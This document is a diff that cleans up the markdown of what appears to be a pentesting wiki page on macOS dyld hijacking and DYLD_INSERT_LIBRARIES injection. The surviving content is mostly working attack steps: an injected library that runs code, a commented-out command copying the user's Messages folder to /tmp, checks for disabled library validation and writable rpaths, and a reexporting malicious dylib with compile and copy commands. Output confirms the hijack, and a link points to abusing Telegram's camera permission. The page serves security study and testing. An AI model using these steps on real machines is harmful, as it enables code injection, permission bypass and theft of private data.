@@ -1,6 +1,5 @@
 # macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES
 
-
 ## DYLD_INSERT_LIBRARIES Basic example
 
 **Library to inject** to execute a shell:
@@ -22,7 +21,7 @@ void myconstructor(int argc, const char **argv)
     //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-```
+
 Binary to attack:
 
 ```c
@@ -35,23 +34,22 @@ int main()
     return 0;
 }
 ```
-```
+
 Injection:
 
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
-```
+
 ## Dyld Hijacking Example
 
 The targeted vulnerable binary is `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 **entitlements**
 
-_codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
-[...]com.apple.security.cs.disable-library-validation[...]
-```
-
+<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
+<strong>[...]com.apple.security.cs.disable-library-validation[...]
+</strong></code></pre>
 
 **LC_RPATH**
 
@@ -66,7 +64,6 @@ otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RP
       cmdsize 32
          path @loader_path/../lib2 (offset 12)
 ```
-```
 
 **@rpath**
 
@@ -79,8 +76,6 @@ otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpa
 compatibility version 1.0.0
 # Check the versions
 ```
-```
-
 
 With the previous info we know that it's **not checking the signature of the loaded libraries** and it's **trying to load a library from**:
 
@@ -96,7 +91,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-```
+
 So, it's possible to hijack it! Create a library that **executes some arbitrary code and exports the same functionalities** as the legit library by reexporting it. And remember to compile it with the expected versions:
 
 ```objectivec:lib.m
@@ -107,14 +102,14 @@ void custom(int argc, const char **argv) {
     NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-```
+
 Compile it:
 
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-```
+
 The reexport path created in the library is relative to the loader, lets change it for an absolute path to the library to export:
 
 ```bash
@@ -133,22 +128,22 @@ otool -l /tmp/lib.dylib| grep REEXPORT -A 2
       cmdsize 128
          name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-```
+
 Finally just copy it to the **hijacked location**:
 
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
-```
+
 And **execute** the binary and check the **library was loaded**:
 
-_"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
-2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
-Usage: [...]
-```
+<pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
+<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
+</strong>Usage: [...]
+</code></pre>
 
 > [!TIP]
-> A nice writeup about how to abuse this vulnerability to abuse the camera permissions of telegram can be found in [[https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/|https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/]]
+> A nice writeup about how to abuse this vulnerability to abuse the camera permissions of telegram can be found in [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 
 ## Bigger Scale
 
@@ -157,7 +152,4 @@ If you are planing on trying to inject libraries in unexpected binaries you coul
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
-```
-
-
 
